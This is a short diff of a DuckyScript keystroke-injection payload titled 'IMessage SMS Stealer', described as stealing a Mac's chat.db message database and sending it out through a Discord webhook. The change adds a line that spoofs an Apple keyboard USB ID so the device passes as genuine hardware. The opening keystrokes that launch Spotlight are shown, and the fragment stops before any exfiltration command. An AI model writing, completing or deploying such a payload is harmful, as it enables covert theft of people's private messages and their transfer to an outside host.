@@ -1,5 +1,6 @@
 REM Title: IMessage SMS Stealer
 REM Description: Steal the chat.db from a Mac and send it through your discord webhook
+ID 05ac:021e Apple:Keyboard
 DELAY 1000
 GUI SPACE
 DELAY 1500
